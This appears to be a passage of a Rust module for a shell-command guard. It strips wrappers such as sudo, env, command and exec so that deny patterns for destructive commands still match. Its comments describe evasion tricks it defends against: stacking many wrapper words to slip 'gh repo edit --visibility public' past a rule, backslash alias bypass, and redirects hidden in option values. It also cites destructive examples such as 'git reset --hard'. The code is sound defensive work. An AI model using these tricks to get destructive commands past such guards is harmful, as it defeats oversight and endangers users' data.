//! Command normalization for wrapper prefix stripping.
//!
//! This module strips common wrapper prefixes (sudo, env, backslash escapes, command)
//! so destructive patterns match consistently regardless of how commands are invoked.
//!
//! # Design Principles
//!
//! - **Conservative**: Only strip wrappers when syntax is unambiguous.
//! - **Non-destructive**: Never change the meaning of non-wrapper commands.
//! - **Preserve original**: Return both original and normalized forms for explain output.
//!
//! # Supported Wrappers
//!
//! - `sudo [-EHnkKSb] [-u user] [-g group] ...` - privilege escalation
//! - `env [-i] [-u name] [NAME=VALUE]... command` - environment modification
//! - `\git`, `\rm` - bash alias bypass (leading backslash)
//! - `command [-p] [--] cmd` - but NOT `command -v` or `command -V` (query mode)

use fancy_regex::Regex;
use smallvec::SmallVec;
use std::borrow::Cow;
use std::collections::{BTreeSet, HashMap, HashSet};
use std::ops::Range;
use std::sync::LazyLock;

/// Result of command normalization.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NormalizedCommand<'a> {
    /// The original command, unchanged.
    pub original: &'a str,
    /// The normalized command with wrappers stripped.
    /// Same as original if no wrappers were stripped.
    pub normalized: Cow<'a, str>,
    /// List of wrappers that were stripped (for explain/debug output).
    pub stripped_wrappers: Vec<StrippedWrapper>,
    /// Whether the walk stopped on its own iteration bound rather than because
    /// no wrapper was left.
    ///
    /// When this is set, `normalized` still begins with a wrapper word, so the
    /// real executable is further right and unknown. A caller that resolves
    /// argv0 has to treat that as "unresolved" rather than as an answer (#424):
    /// `command … × 97 … gh repo edit --visibility public` left `command` in
    /// the executable slot, an `executables = ["gh"]` rule was skipped for not
    /// being about `command`, and the command was allowed — while 96 wrappers
    /// denied, and the same rule without the scope denied at any depth.
    pub wrapper_limit_reached: bool,
}

/// A wrapper that was stripped from the command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct StrippedWrapper {
    /// The wrapper type (e.g., "sudo", "env", "backslash", "command").
    pub wrapper_type: &'static str,
    /// The exact text that was stripped.
    pub stripped_text: String,
}

impl<'a> NormalizedCommand<'a> {
    /// Create a new normalized command where no wrappers were stripped.
    #[must_use]
    #[allow(clippy::missing_const_for_fn)] // Vec::new() is not const-stable
    pub fn unchanged(command: &'a str) -> Self {
        Self {
            original: command,
            normalized: Cow::Borrowed(command),
            stripped_wrappers: Vec::new(),
            wrapper_limit_reached: false,
        }
    }

    /// Check if any normalization was performed.
    #[must_use]
    pub fn was_normalized(&self) -> bool {
        !self.stripped_wrappers.is_empty()
    }
}

/// Normalize a command by stripping common wrapper prefixes.
///
/// Returns the original command alongside the normalized form and a list of
/// stripped wrappers for debugging/explain purposes.
///
/// # Examples
///
/// ```ignore
/// let result = strip_wrapper_prefixes("sudo git reset --hard");
/// assert_eq!(result.normalized, "git reset --hard");
/// assert_eq!(result.stripped_wrappers[0].wrapper_type, "sudo");
/// ```
#[must_use]
pub fn strip_wrapper_prefixes(command: &str) -> NormalizedCommand<'_> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return NormalizedCommand::unchanged(command);
    }

    let mut current = trimmed.to_string();
    let mut stripped_wrappers = Vec::new();

    // Iteratively strip wrappers until no more are found
    // Limit iterations to prevent DoS from maliciously crafted commands
    const MAX_WRAPPER_ITERATIONS: usize = 32;
    let mut iteration_count = 0;
    let mut limit_reached = false;
    loop {
        iteration_count += 1;
        if iteration_count > MAX_WRAPPER_ITERATIONS {
            // Too many wrapper layers - treat as suspicious and stop stripping.
            // The caller is told, because what is left in the executable slot
            // is a wrapper word rather than the executable (#424).
            limit_reached = true;
            break;
        }
        let before_len = current.len();

        // Try stripping each wrapper type in order
        if let Some((remaining, wrapper)) = strip_sudo(&current) {
            stripped_wrappers.push(wrapper);
            current = remaining;
            continue;
        }

        if let Some((remaining, wrapper)) = strip_env(&current) {
            stripped_wrappers.push(wrapper);
            current = remaining;
            continue;
        }

        if let Some((remaining, wrapper)) = strip_command_wrapper(&current) {
            stripped_wrappers.push(wrapper);
            current = remaining;
            continue;
        }

        if let Some((remaining, wrapper)) = strip_posix_assignment_prefix(&current) {
            stripped_wrappers.push(wrapper);
            current = remaining;
            continue;
        }

        if let Some((remaining, wrapper)) = strip_execution_wrapper(&current) {
            stripped_wrappers.push(wrapper);
            current = remaining;
            continue;
        }

        if let Some((remaining, wrapper)) = strip_leading_backslash(&current) {
            stripped_wrappers.push(wrapper);
            current = remaining;
            continue;
        }

        // No more wrappers found
        if current.len() == before_len {
            break;
        }
    }

    if stripped_wrappers.is_empty() {
        NormalizedCommand::unchanged(command)
    } else {
        NormalizedCommand {
            original: command,
            normalized: Cow::Owned(current),
            stripped_wrappers,
            wrapper_limit_reached: limit_reached,
        }
    }
}

/// Whether a recognized wrapper invalidates evidence from the caller's cwd or
/// home. This observes the existing normalization proof; it never strips an
/// additional wrapper or changes the command used for pattern matching.
///
/// The result belongs to the wrapped process. A redirect on the outside of
/// `env -C other command < local.sql` is still opened by the caller's shell.
pub(crate) fn wrapper_changes_filesystem_context(command: &str) -> bool {
    wrapper_changes_filesystem_context_at_depth(command, 0)
}

fn wrapper_changes_filesystem_context_at_depth(command: &str, depth: usize) -> bool {
    // Split-string options can contain further env options or wrappers. The
    // bound is independent of normalization's own wrapper iteration limit.
    if depth >= 8 {
        return true;
    }
    let normalized = strip_wrapper_prefixes(command);
    normalized.wrapper_limit_reached
        || normalized
            .stripped_wrappers
            .iter()
            .any(|wrapper| match wrapper.wrapper_type {
                "sudo" | "mise-exec" => true,
                "assignment" => assignment_changes_filesystem_context(&wrapper.stripped_text),
                "env" => {
                    let text = wrapper.stripped_text.trim_start();
                    let options_start = text.find(char::is_whitespace).unwrap_or(text.len());
                    env_prefix_changes_filesystem_context(&text[options_start..], depth, false)
                }
                "exec" => {
                    let tokens = tokenize_for_normalization(&wrapper.stripped_text);
                    let mut changed = false;
                    let _ =
                        exec_wrapper_command_index(&wrapper.stripped_text, &tokens, &mut changed);
                    changed
                }
                _ => false,
            })
}

fn home_environment_name(name: &str) -> bool {
    matches!(name, "HOME" | "USERPROFILE" | "HOMEDRIVE" | "HOMEPATH")
}

fn filesystem_context_env_name(raw: &str) -> bool {
    let raw = raw.trim();
    let decoded = decode_posix_syntax_token(raw);
    // An unresolved unset operand could expand to one of these names. A
    // successfully decoded quoted literal such as '$HOME' is ordinary data.
    (matches!(&decoded, Cow::Borrowed(_)) && raw.contains(['$', '`']))
        || decoded.contains(['*', '?', '['])
        || home_environment_name(decoded.as_ref())
        || decoded == "PSQLRC"
}

fn assignment_changes_filesystem_context(raw: &str) -> bool {
    let decoded = decode_posix_syntax_token(raw);
    let Some((name, _)) = decoded.split_once('=') else {
        return false;
    };
    let name = name.strip_suffix('+').unwrap_or(name);
    let name = name.split_once('[').map_or(name, |(name, _)| name);
    // Explicit PSQLRC assignments already have their own file-source proof.
    (matches!(&decoded, Cow::Borrowed(_)) && name.contains(['$', '`']))
        || home_environment_name(name)
}

fn env_prefix_changes_filesystem_context(rest: &str, depth: usize, inspect_command: bool) -> bool {
    if depth >= 8 {
        return true;
    }
    let bytes = rest.as_bytes();
    let mut changed = false;
    let parsed = parse_env_options(rest, bytes, 0, &mut changed);
    if changed {
        return true;
    }
    match parsed {
        EnvParseResult::Continue(index) => {
            let end = parse_env_assignments(bytes, index);
            let assignments = &rest[index..end];
            tokenize_for_normalization(assignments)
                .iter()
                .filter_map(|token| token.text(assignments))
                .any(assignment_changes_filesystem_context)
                || (inspect_command
                    && !rest[end..].trim().is_empty()
                    && wrapper_changes_filesystem_context_at_depth(&rest[end..], depth + 1))
        }
        EnvParseResult::SplitString(_, remaining) => {
            env_prefix_changes_filesystem_context(&remaining, depth + 1, true)
        }
        // The main parser has already accepted the actual wrapper. If a
        // nested split-string option cannot be proved, no local file proof is
        // valid; this does not change normalization of that nested command.
        EnvParseResult::Abort => true,
    }
}

/// Strip `sudo` prefix with its options.
///
/// Handles: `-E`, `-H`, `-n`, `-k`, `-K`, `-S`, `-s`, `-b`, `-i`, `-P`, `-A`, `-B`,
/// `-u <user>`, `-g <group>`, `-h <host>`, `-p <prompt>`, `-C <num>`, `-r <role>`,
/// `-U <user>`, `-D <dir>`, and `--` terminator.
#[allow(clippy::too_many_lines)]
fn strip_sudo(command: &str) -> Option<(String, StrippedWrapper)> {
    // Options that take no argument
    // -s (shell) runs user's shell; if a command follows, it's passed via -c
    // -B (bell) rings bell on password prompt
    const SIMPLE_FLAGS: &[char] = &['E', 'H', 'n', 'k', 'K', 'S', 's', 'b', 'i', 'P', 'A', 'B'];
    // Options that take an argument
    // -D (chdir) changes to directory before running command
    const ARG_FLAGS: &[char] = &['u', 'g', 'h', 'p', 'C', 'r', 'U', 'D', 't', 'a', 'T'];

    let trimmed = command.trim_start();

    // Check for "sudo" or "/path/to/sudo"
    let first_word_end = trimmed.find(char::is_whitespace).unwrap_or(trimmed.len());
    let first_word = &trimmed[..first_word_end];
    let basename = first_word.rsplit('/').next().unwrap_or(first_word);

    if basename != "sudo" {
        return None;
    }

    // Must be followed by whitespace or end
    let after_sudo = &trimmed[first_word.len()..];
    if !after_sudo.is_empty() && !after_sudo.starts_with(char::is_whitespace) {
        return None;
    }

    let rest = after_sudo.trim_start();
    let mut idx = 0;
    let bytes = rest.as_bytes();
    let mut braces = BraceLookup::default();

    while idx < bytes.len() {
        // Skip whitespace
        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
            idx += 1;
        }
        if idx >= bytes.len() {
            break;
        }

        // Check for -- terminator
        if bytes[idx] == b'-' && idx + 1 < bytes.len() && bytes[idx + 1] == b'-' {
            // Check if it's exactly "--" followed by whitespace or end
            if idx + 2 >= bytes.len() || bytes[idx + 2].is_ascii_whitespace() {
                idx += 2;
                while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
                    idx += 1;
                }
                break;
            }
        }

        if bytes[idx] != b'-' {
            break;
        }

        // Parse one option word (e.g., -E, -EH, -uuser)
        let word_start = idx;
        let word_end = consume_word_token_with(bytes, idx, bytes.len(), &mut braces);

        if word_end <= word_start + 1 {
            break;
        }

        let word = &rest[word_start..word_end];
        if word == "--" {
            idx = word_end;
            while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
                idx += 1;
            }
            break;
        }

        if word.starts_with("--") {
            // Unknown long option - not safe to strip
            return None;
        }

        let mut needs_arg = false;
        let mut unknown_flag = false;
        let mut saw_arg_inline = false;
        let mut chars = word[1..].chars().peekable();

        while let Some(flag) = chars.next() {
            if SIMPLE_FLAGS.contains(&flag) {
                continue;
            }
            if ARG_FLAGS.contains(&flag) {
                if chars.peek().is_some() {
                    // Inline argument (e.g., -uroot)
                    saw_arg_inline = true;
                } else {
                    needs_arg = true;
                }
                // Arg flags consume the rest of the token (if any)
                break;
            }
            unknown_flag = true;
            break;
        }

        if unknown_flag {
            return None;
        }

        idx = word_end;

        if saw_arg_inline {
            if token_has_shell_effect(word.as_bytes()) {
                return None;
            }
            continue;
        }

        if needs_arg {
            // Skip whitespace before argument
            while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
                idx += 1;
            }
            if idx >= bytes.len() {
                // Missing argument - don't strip
                return None;
            }
            // Skip argument token
            let arg_start = idx;
            idx = consume_word_token_with(bytes, idx, bytes.len(), &mut braces);
            if token_has_shell_effect(&bytes[arg_start..idx]) {
                return None;
            }
        }
    }

    // Skip any remaining whitespace
    while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
        idx += 1;
    }

    let remaining = &rest[idx..];
    if remaining.is_empty() {
        // sudo with no command - don't strip
        return None;
    }

    let stripped_text = trimmed[..trimmed.len() - remaining.len()]
        .trim_end()
        .to_string();

    Some((
        remaining.to_string(),
        StrippedWrapper {
            wrapper_type: "sudo",
            stripped_text,
        },
    ))
}

/// Strip `env` prefix with options and environment variable assignments.
///
/// Handles:
/// - optional path prefix (e.g., `/usr/bin/env`)
/// - options: `-i`, `-u <name>`, `-C <dir>`, `-S <cmd>`, `-f <path>`, `-a <argv0>`, `-0`, `-v`
/// - long options: `--ignore-environment`, `--unset`, `--chdir`, `--split-string`, `--file`,
///   `--argv0`, `--null`, `--debug`, `--ignore-signal`
/// - `NAME=VALUE` assignments
fn strip_env(command: &str) -> Option<(String, StrippedWrapper)> {
    let trimmed = command.trim_start();

    // Check for "env" or "/path/to/env"
    // We split on whitespace to check the first token.
    let first_word_end = trimmed.find(char::is_whitespace).unwrap_or(trimmed.len());
    let first_word = &trimmed[..first_word_end];
    let basename = first_word.rsplit('/').next().unwrap_or(first_word);

    if basename != "env" {
        return None;
    }

    // Must be followed by whitespace or end
    let after_env = &trimmed[first_word.len()..];
    if !after_env.is_empty() && !after_env.starts_with(char::is_whitespace) {
        return None;
    }

    let rest = after_env.trim_start();
    if rest.is_empty() {
        // Just "env" with no args - don't strip (it prints environment)
        return None;
    }

    let bytes = rest.as_bytes();
    let mut idx = 0;

    // Phase 1: Parse options (including -S/--split-string special case)
    let mut filesystem_context_changed = false;
    match parse_env_options(rest, bytes, idx, &mut filesystem_context_changed) {
        EnvParseResult::Continue(new_idx) => idx = new_idx,
        EnvParseResult::Abort => return None,
        EnvParseResult::SplitString(idx, remaining) => {
            let stripped_len = trimmed.len() - rest.len() + idx;
            let stripped_text = trimmed[..stripped_len].trim_end().to_string();
            return Some((
                remaining,
                StrippedWrapper {
                    wrapper_type: "env",
                    stripped_text,
                },
            ));
        }
    }

    // Phase 2: Parse variable assignments (NAME=VALUE)
    idx = parse_env_assignments(bytes, idx);

    // Skip any remaining whitespace
    while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
        idx += 1;
    }

    let remaining = &rest[idx..];
    if remaining.is_empty() {
        // env with no command (just assignments) - don't strip
        return None;
    }

    let stripped_text = trimmed[..trimmed.len() - remaining.len()]
        .trim_end()
        .to_string();

    Some((
        remaining.to_string(),
        StrippedWrapper {
            wrapper_type: "env",
            stripped_text,
        },
    ))
}

enum EnvParseResult {
    Continue(usize),
    SplitString(usize, String),
    Abort,
}

#[allow(clippy::too_many_lines)]
fn parse_env_options(
    rest: &str,
    bytes: &[u8],
    mut idx: usize,
    filesystem_context_changed: &mut bool,
) -> EnvParseResult {
    let mut braces = BraceLookup::default();
    let consume_env_arg = |mut idx: usize, braces: &mut BraceLookup| -> Option<usize> {
        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
            idx += 1;
        }
        if idx >= bytes.len() {
            return None;
        }
        let arg_start = idx;
        let end = consume_word_token_with(bytes, idx, bytes.len(), braces);
        if token_has_shell_effect(&bytes[arg_start..end]) {
            return None;
        }
        Some(end)
    };

    while idx < bytes.len() {
        // Skip whitespace
        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
            idx += 1;
        }
        if idx >= bytes.len() {
            break;
        }

        // Check for options
        if bytes[idx] != b'-' {
            return EnvParseResult::Continue(idx);
        }

        let word_start = idx;
        let word_end = consume_word_token_with(bytes, idx, bytes.len(), &mut braces);
        if word_end <= word_start + 1 {
            break;
        }

        let word = &rest[word_start..word_end];
        if word == "-" {
            // A lone "-" implies -i (ignore environment)
            *filesystem_context_changed = true;
            idx = word_end;
            continue;
        }

        if word == "--" {
            idx = word_end;
            while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
                idx += 1;
            }
            return EnvParseResult::Continue(idx);
        }

        if word.starts_with("--") {
            let (name, value_opt) = word.find('=').map_or((word, None), |eq_pos| {
                (&word[..eq_pos], Some(&word[eq_pos + 1..]))
            });

            match name {
                "--ignore-environment" | "--null" | "--debug" => {
                    if value_opt.is_some() {
                        return EnvParseResult::Abort;
                    }
                    *filesystem_context_changed |= name == "--ignore-environment";
                    idx = word_end;
                    continue;
                }
                "--unset" | "--chdir" | "--file" | "--argv0" | "--ignore-signal" => {
                    *filesystem_context_changed |= matches!(name, "--chdir" | "--file");
                    if let Some(value) = value_opt {
                        if token_has_shell_effect(value.as_bytes()) {
                            return EnvParseResult::Abort;
                        }
                        *filesystem_context_changed |=
                            name == "--unset" && filesystem_context_env_name(value);
                        idx = word_end;
                        continue;
                    }
                    let Some(next_idx) = consume_env_arg(word_end, &mut braces) else {
                        return EnvParseResult::Abort;
                    };
                    *filesystem_context_changed |=
                        name == "--unset" && filesystem_context_env_name(&rest[word_end..next_idx]);
                    idx = next_idx;
                    continue;
                }
                "--split-string" => {
                    let raw_arg = if let Some(value) = value_opt {
                        if value.is_empty() {
                            return EnvParseResult::Abort;
                        }
                        value.to_string()
                    } else {
                        let Some(next_idx) = consume_env_arg(word_end, &mut braces) else {
                            return EnvParseResult::Abort;
                        };
                        let arg = &rest[word_end..next_idx];
                        arg.trim_start().to_string()
                    };

                    let unquoted = unquote_env_s_arg(&raw_arg);
                    idx = word_end;
                    if value_opt.is_none() {
                        idx = word_end;
                        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
                            idx += 1;
                        }
                        idx = consume_word_token_with(bytes, idx, bytes.len(), &mut braces);
                    }

                    while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
                        idx += 1;
                    }
                    let rest_of_line = &rest[idx..];
                    let remaining = if rest_of_line.is_empty() {
                        unquoted
                    } else {
                        format!("{unquoted} {rest_of_line}")
                    };
                    return EnvParseResult::SplitString(idx, remaining);
                }
                _ => return EnvParseResult::Abort,
            }
        }

        let word_bytes = word.as_bytes();
        let mut pos = 1;
        while pos < word_bytes.len() {
            let flag = word_bytes[pos] as char;
            match flag {
                'i' | '0' | 'v' => {
                    *filesystem_context_changed |= flag == 'i';
                    pos += 1;
                }
                'S' => {
                    let raw_arg = if pos + 1 < word_bytes.len() {
                        word[pos + 1..].to_string()
                    } else {
                        let Some(next_idx) = consume_env_arg(word_end, &mut braces) else {
                            return EnvParseResult::Abort;
                        };
                        let arg = &rest[word_end..next_idx];
                        arg.trim_start().to_string()
                    };

                    let unquoted = unquote_env_s_arg(&raw_arg);
                    idx = word_end;
                    if pos + 1 >= word_bytes.len() {
                        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
                            idx += 1;
                        }
                        idx = consume_word_token_with(bytes, idx, bytes.len(), &mut braces);
                    }

                    while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
                        idx += 1;
                    }
                    let rest_of_line = &rest[idx..];
                    let remaining = if rest_of_line.is_empty() {
                        unquoted
                    } else {
                        format!("{unquoted} {rest_of_line}")
                    };
                    return EnvParseResult::SplitString(idx, remaining);
                }
                'u' | 'P' | 'C' | 'f' | 'a' => {
                    *filesystem_context_changed |= matches!(flag, 'C' | 'f');
                    if pos + 1 < word_bytes.len() {
                        if token_has_shell_effect(&word_bytes[pos + 1..]) {
                            return EnvParseResult::Abort;
                        }
                        *filesystem_context_changed |=
                            flag == 'u' && filesystem_context_env_name(&word[pos + 1..]);
                        idx = word_end;
                    } else {
                        let Some(next_idx) = consume_env_arg(word_end, &mut braces) else {
                            return EnvParseResult::Abort;
                        };
                        *filesystem_context_changed |=
                            flag == 'u' && filesystem_context_env_name(&rest[word_end..next_idx]);
                        idx = next_idx;
                    }
                    pos = word_bytes.len();
                }
                _ => return EnvParseResult::Abort,
            }
        }

        if idx < word_end {
            idx = word_end;
        }
    }
    EnvParseResult::Continue(idx)
}

fn parse_env_assignments(bytes: &[u8], mut idx: usize) -> usize {
    let mut braces = BraceLookup::default();
    while idx < bytes.len() {
        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
            idx += 1;
        }
        if idx >= bytes.len() {
            break;
        }

        let start = idx;
        let end = consume_word_token_with(bytes, idx, bytes.len(), &mut braces);
        if start >= end {
            return start;
        }

        let word_bytes = &bytes[start..end];
        let has_equals = word_bytes.iter().position(|b| *b == b'=');

        if has_equals.is_some_and(|pos| pos > 0) {
            if token_has_shell_effect(word_bytes) {
                return start;
            }
            idx = end;
            continue;
        }

        return start;
    }

    idx
}

/// A removable wrapper word must not contain shell actions of its own.
///
/// The lightweight normalizer keeps redirects inside `Word` tokens, including
/// a bare `>` and attached forms such as `5>file` or `--unset=NAME>file`.
/// Consuming one as an option value would erase a redirect the shell performs
/// before it even runs the wrapper (#531). Refuse that normalization while
/// preserving quoted and escaped operators as ordinary argument data.
fn token_has_shell_effect(token: &[u8]) -> bool {
    let mut i = 0;
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;

    while i < token.len() {
        let byte = token[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }

        if byte == b'\\' && !in_single {
            escaped = true;
            i = (i + 1).min(token.len());
            continue;
        }

        match byte {
            b'\'' if !in_double => {
                in_single = !in_single;
            }
            b'"' if !in_single => {
                in_double = !in_double;
            }
            b'`' if !in_single => return true,
            b'$' if !in_single && i + 1 < token.len() && token[i + 1] == b'(' => return true,
            b'<' | b'>' if !in_single && !in_double => return true,
            _ => {}
        }

        i += 1;
    }

    false
}
fn unquote_env_s_arg(arg: &str) -> String {
    let bytes = arg.as_bytes();
    if bytes.len() >= 2 {
        let first = bytes[0];
        let last = bytes[bytes.len() - 1];
        if (first == b'"' && last == b'"') || (first == b'\'' && last == b'\'') {
            return arg[1..arg.len() - 1].to_string();
        }
    }
    arg.to_string()
}

/// Strip `command` wrapper, but NOT when used in query mode (`-v`/`-V`).
fn strip_command_wrapper(command: &str) -> Option<(String, StrippedWrapper)> {
    let trimmed = command.trim_start();

    // Check for "command" or "/path/to/command"
    let first_word_end = trimmed.find(char::is_whitespace).unwrap_or(trimmed.len());
    let first_word = &trimmed[..first_word_end];
    let basename = first_word.rsplit('/').next().unwrap_or(first_word);

    if basename != "command" {
        return None;
    }

    // Must be followed by whitespace or end
    let after_command = &trimmed[first_word.len()..];
    if !after_command.is_empty() && !after_command.starts_with(char::is_whitespace) {
        return None;
    }

    let rest = after_command.trim_start();
    if rest.is_empty() {
        return None;
    }

    let mut idx = 0;
    let bytes = rest.as_bytes();

    while idx < bytes.len() {
        // Skip whitespace
        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
            idx += 1;
        }
        if idx >= bytes.len() {
            break;
        }

        if bytes[idx] != b'-' {
            break;
        }

        // Parse one option word (e.g., -p, -pv, --)
        let word_start = idx;
        let mut word_end = idx + 1;
        while word_end < bytes.len() && !bytes[word_end].is_ascii_whitespace() {
            word_end += 1;
        }

        if word_end <= word_start + 1 {
            break;
        }

        let word = &rest[word_start..word_end];
        if word == "--" {
            idx = word_end;
            while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
                idx += 1;
            }
            break;
        }
        if word.starts_with("--") {
            // Unknown long option - not safe to strip
            return None;
        }

        let mut unknown = false;
        for flag in word[1..].chars() {
            match flag {
                'v' | 'V' => {
                    // Query mode - NOT a wrapper
                    return None;
                }
                'p' => {}
                _ => {
                    unknown = true;
                    break;
                }
            }
        }
        if unknown {
            return None;
        }

        idx = word_end;
    }

    // Skip any remaining whitespace
    while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
        idx += 1;
    }

    let remaining = &rest[idx..];
    if remaining.is_empty() {
        return None;
    }
    if starts_with_shell_redirection(remaining) {
        return None;
    }

    let stripped_text = trimmed[..trimmed.len() - remaining.len()]
        .trim_end()
        .to_string();

    Some((
        remaining.to_string(),
        StrippedWrapper {
            wrapper_type: "command",
            stripped_text,
        },
    ))
}

fn assignment_feeds_git_configuration(name: &str, command: &str) -> bool {
    if !name.starts_with("GIT_CONFIG_") && !command.contains("--config-env") {
        return false;
    }
    let tokens = tokenize_for_normalization(command);
    let mut decoder = ShellTokenDecoder::new(ShellDialect::Posix);
    let mut git_executable = false;
    let mut config_env = false;
    for token in tokens {
        if token.kind == NormalizeTokenKind::Separator {
            break;
        }
        let Some(raw) = token.text(command) else {
            return false;
        };
        let Some(decoded) = decoder.decode(raw, ShellTokenRole::Syntax) else {
            continue;
        };
        if !git_executable && is_env_assignment(decoded.as_ref()) {
            continue;
        }
        if !git_executable {
            let executable = decoded
                .rsplit(['/', '\\'])
                .next()
                .unwrap_or_else(|| decoded.as_ref())
                .trim_end_matches(".exe");
            if !executable.eq_ignore_ascii_case("git") {
                return false;
            }
            git_executable = true;
            continue;
        }
        config_env |= decoded == "--config-env" || decoded.starts_with("--config-env=");
    }
    git_executable && (name.starts_with("GIT_CONFIG_") || config_env)
}

fn strip_posix_assignment_prefix(command: &str) -> Option<(String, StrippedWrapper)> {
    let trimmed = command.trim_start();
    let tokens = tokenize_for_normalization(trimmed);
    let token = tokens.first()?;
    if token.kind != NormalizeTokenKind::Word {
        return None;
    }
    let raw = token.text(trimmed)?;
    let mut decoder = ShellTokenDecoder::new(ShellDialect::Posix);
    let decoded = decoder.decode(raw, ShellTokenRole::Syntax)?;
    if !is_env_assignment(decoded.as_ref()) || token_has_shell_effect(raw.as_bytes()) {
        return None;
    }
    let tail = trimmed.get(token.byte_range.end..)?;
    // A newline or explicit separator ends the assignment-only command. It is
    // shell state for a later segment, not an environment prefix on that
    // segment, so removing it would erase visible data flow such as
    // `db=psql; ... | "$db"`.
    let after_horizontal_space = tail.trim_start_matches([' ', '\t']);
    if after_horizontal_space.starts_with(['\r', '\n'])
        || tokenize_for_normalization(after_horizontal_space)
            .first()
            .is_some_and(|next| next.kind == NormalizeTokenKind::Separator)
    {
        return None;
    }
    let remaining = tail.trim_start();
    if remaining.is_empty() || starts_with_shell_redirection(remaining) {
        return None;
    }
    let assignment_name = decoded.split_once('=')?.0;
    // Git's `--config-env` and GIT_CONFIG_* channels intentionally consume
    // invocation-local environment assignments. Keep those assignments in the
    // semantic view so alias bodies and format data cannot be detached from
    // the Git command that reads them.
    if assignment_feeds_git_configuration(assignment_name, remaining) {
        return None;
    }
    Some((
        remaining.to_string(),
        StrippedWrapper {
            wrapper_type: "assignment",
            stripped_text: raw.to_string(),
        },
    ))
}

fn wrapper_word(command: &str, tokens: &[NormalizeToken], index: usize) -> Option<String> {
    let token = tokens.get(index)?;
    if token.kind != NormalizeTokenKind::Word {
        return None;
    }
    let raw = token.text(command)?;
    if token_has_shell_effect(raw.as_bytes()) {
        return None;
    }
    ShellTokenDecoder::new(ShellDialect::Posix)
        .decode(raw, ShellTokenRole::Syntax)
        .map(Cow::into_owned)
}

fn wrapper_command_suffix<'a>(
    command: &'a str,
    tokens: &[NormalizeToken],
    index: usize,
) -> Option<&'a str> {
    let token = tokens.get(index)?;
    (token.kind == NormalizeTokenKind::Word)
        .then(|| command.get(token.byte_range.start..))
        .flatten()
}

fn wrapper_terminal_option(word: &str) -> bool {
    matches!(word, "-h" | "--help" | "-V" | "--version")
}

fn exec_wrapper_command_index(
    command: &str,
    tokens: &[NormalizeToken],
    filesystem_context_changed: &mut bool,
) -> Option<usize> {
    let mut index = 1usize;
    while let Some(word) = wrapper_word(command, tokens, index) {
        if word == "--" {
            return (index + 1 < tokens.len()).then_some(index + 1);
        }
        if word == "-a" {
            wrapper_word(command, tokens, index + 1)?;
            index += 2;
            continue;
        }
        if word.strip_prefix('-').is_some_and(|flags| {
            !flags.is_empty() && flags.bytes().all(|b| matches!(b, b'c' | b'l'))
        }) {
            *filesystem_context_changed |= word.contains('c');
            index += 1;
            continue;
        }
        return (!word.starts_with('-')).then_some(index);
    }
    None
}

fn time_wrapper_command_index(command: &str, tokens: &[NormalizeToken]) -> Option<usize> {
    let mut index = 1usize;
    while let Some(word) = wrapper_word(command, tokens, index) {
        if word == "--" {
            return (index + 1 < tokens.len()).then_some(index + 1);
        }
        if wrapper_terminal_option(&word) {
            return None;
        }
        if matches!(
            word.as_str(),
            "-a" | "--append" | "-p" | "--portability" | "-q" | "--quiet" | "-v" | "--verbose"
        ) {
            index += 1;
            continue;
        }
        if matches!(word.as_str(), "-f" | "--format" | "-o" | "--output") {
            wrapper_word(command, tokens, index + 1)?;
            index += 2;
            continue;
        }
        // `-fFORMAT` / `-oFILE` carry their value. Only an option does: a
        // program word whose second byte is `f` or `o` (`/opt/...`, `sort`)
        // is the command, and skipping it handed the next word that role.
        if word.starts_with("--format=")
            || word.starts_with("--output=")
            || word.len() > 2 && word.starts_with('-') && matches!(word.as_bytes()[1], b'f' | b'o')
            || word.strip_prefix('-').is_some_and(|flags| {
                !flags.is_empty()
                    && flags
                        .bytes()
                        .all(|b| matches!(b, b'a' | b'p' | b'q' | b'v'))
            })
        {
            index += 1;
            continue;
        }
        return (!word.starts_with('-')).then_some(index);
    }
    None
}

fn nice_wrapper_command_index(command: &str, tokens: &[NormalizeToken]) -> Option<usize> {
    let mut index = 1usize;
    while let Some(word) = wrapper_word(command, tokens, index) {
        if word == "--" {
            return (index + 1 < tokens.len()).then_some(index + 1);
        }
        if wrapper_terminal_option(&word) {
            return None;
        }
        if matches!(word.as_str(), "-n" | "--adjustment") {
            wrapper_word(command, tokens, index + 1)?;
            index += 2;
            continue;
        }
        if word
            .strip_prefix("--adjustment=")
            .is_some_and(|value| !value.is_empty())
            || word
                .strip_prefix("-n")
                .is_some_and(|value| !value.is_empty())
            || word.strip_prefix('-').is_some_and(|value| {
                !value.is_empty()
                    && value
                        .strip_prefix('+')
                        .unwrap_or(value)
                        .bytes()
                        .all(|byte| byte.is_ascii_digit())
            })
        {
            index += 1;
            continue;
        }
        return (!word.starts_with('-')).then_some(index);
    }
    None
}

fn ionice_wrapper_command_index(command: &str, tokens: &[NormalizeToken]) -> Option<usize> {
    let mut index = 1usize;
    while let Some(word) = wrapper_word(command, tokens, index) {
        if word == "--" {
            return (index + 1 < tokens.len()).then_some(index + 1);
        }
        if wrapper_terminal_option(&word)
            || matches!(
                word.as_str(),
                "-p" | "--pid" | "-P" | "--pgid" | "-u" | "--uid"
            )
            || word.starts_with("--pid=")
            || word.starts_with("--pgid=")
            || word.starts_with("--uid=")
        {
            return None;
        }
        if matches!(word.as_str(), "-t" | "--ignore") {
            index += 1;
            continue;
        }
        if matches!(word.as_str(), "-c" | "--class" | "-n" | "--classdata") {
            wrapper_word(command, tokens, index + 1)?;
            index += 2;
            continue;
        }
        if word
